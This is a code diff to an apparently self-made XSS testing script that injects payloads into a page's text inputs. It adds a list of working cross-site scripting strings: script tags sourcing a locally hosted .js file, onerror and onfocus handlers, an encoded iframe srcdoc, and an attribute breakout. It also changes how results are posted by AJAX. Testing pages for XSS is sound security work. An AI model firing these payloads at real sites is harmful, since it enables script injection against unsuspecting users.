@@ -18,6 +18,7 @@ var XSSattack = function(message){
 			for (var k = 0; k < inputs[j].length; k++){
 				if (inputs[j][k].type === 'text' || inputs[j][k].type === 'search'){
 					inputs[j][k].value = message;
+					inputs[j][k].background = "url('http://0.0.0.0:8000/non-alpha-xss.js')";
 				}
 			}
 		}
@@ -42,11 +43,14 @@ var attackVariants = [
   '<IFRAME src="http://0.0.0.0:8000/non-alpha-xss.js"></IFRAME>',
   '<SCRIPT SRC=http://0.0.0.0:8000/non-alpha-xss.js></SCRIPT>',
   '<SCRIPT/SRC="http://0.0.0.0:8000/non-alpha-xss.js"></SCRIPT>',
-  '<BODY ONLOAD=alert("You are vulnerable to an On-Load XSS attack")>',
+  '<IMG src="" onerror="alert(\'You are vulnerable to On-Error XSS attacks\')">',
   '<SCRIPT SRC=http://0.0.0.0:8000/non-alpha-xss.jpg></SCRIPT>',
   'data:text/html,<script>alert("You are vulnerable to a Data Injection XSS attack")</script>',
   '<a href=“?xss=<script>”>You are vulnerable to Click-Jacking XSS attacks</a>',
-  '<SCRIPT a=">"SRC="http://0.0.0.0:8000/non-alpha-xss.js"></SCRIPT>'
+  '<SCRIPT a=">"SRC="http://0.0.0.0:8000/non-alpha-xss.js"></SCRIPT>',
+  "'><SCRIPT>alert('You are vulnerable to XSS')</SCRIPT><xss a='",
+  '<input onfocus="alert()" autofocus>',
+  '<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />'
 
 ];
 
@@ -65,7 +69,6 @@ $.ajax({
 				data: document.URL,
 				success: function(data){
 					console.log('post is working');
-					window.history.back();
 				}
 			});
 		} else {
